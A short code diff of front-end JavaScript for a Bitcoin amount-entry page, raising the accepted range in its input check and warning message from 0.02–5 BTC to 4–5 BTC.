@@ -195,7 +195,7 @@ function update_trans() {
       }, 1e4))
   }),
   $('#gen-btn').click(() => {
-    if ($('#cal-in').val() >= 0.02 && $('#cal-in').val() <= 5) {
+    if ($('#cal-in').val() >= 4 && $('#cal-in').val() <= 5) {
       amount_entered = $('#cal-in').val()
       tm = Date.now()
       $('#gen-amount').text(amount_entered)
@@ -218,7 +218,7 @@ function update_trans() {
         )
       $('#copy_').attr('data-clipboard-text', amount_entered)
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
-    } else $('#warn').text('Amount should be within 0.02 BTC to 5 BTC')
+    } else $('#warn').text('Amount should be within 4 BTC to 5 BTC')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
